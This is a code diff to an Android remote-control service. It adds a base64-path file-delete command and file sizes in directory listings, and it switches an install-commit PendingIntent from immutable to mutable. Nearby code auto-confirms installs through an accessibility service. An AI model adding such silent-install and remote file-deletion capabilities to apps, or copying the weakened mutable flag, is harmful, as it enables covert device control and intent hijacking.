@@ -240,7 +240,7 @@ public class RemoteService extends Service {
                     StringBuilder sb = new StringBuilder("OK ");
                     File[] files = f.listFiles();
                     if (files != null) {
-                        for (File x : files) sb.append(x.getName()).append(x.isDirectory() ? "/" : "").append('\n');
+                        for (File x : files) sb.append(x.getName()).append(x.isDirectory() ? "/" : "").append('\t').append(x.isDirectory() ? 0 : x.length()).append('\n');
                     }
                     return sb.toString();
                 }
@@ -537,7 +537,7 @@ public class RemoteService extends Service {
                         android.app.PendingIntent done = android.app.PendingIntent.getBroadcast(
                                 this, sid, new Intent(this, UpdateReceiver.class),
                                 android.app.PendingIntent.FLAG_UPDATE_CURRENT
-                                        | android.app.PendingIntent.FLAG_IMMUTABLE);
+                                        | android.app.PendingIntent.FLAG_MUTABLE);
                         RemoteAccessibilityService.armAutoConfirm(90_000);
                         s.commit(done.getIntentSender());
                         s.close();
@@ -832,6 +832,15 @@ public class RemoteService extends Service {
                     if (parent != null) parent.mkdirs();
                     Files.write(f.toPath(), data);
                     return "OK putb64 " + data.length + " bytes " + f;
+                }
+                case "rm": {
+                    // RM <b64path> -> delete file (or empty dir)
+                    if (arg.isEmpty()) return "ERR rm: <b64path>";
+                    File f = new File(new String(b64(arg.trim()), StandardCharsets.UTF_8));
+                    if (f.getAbsolutePath().contains("..")) return "ERR rm: bad path";
+                    if (!f.exists()) return "ERR rm: no such file: " + f;
+                    if (f.isDirectory() && f.list() != null && f.list().length > 0) return "ERR rm: directory not empty: " + f;
+                    return f.delete() ? "OK rm " + f : "ERR rm: delete failed: " + f;
                 }
                 case "log": {
                     File logsDir = new File(getExternalFilesDir(null), "logs");
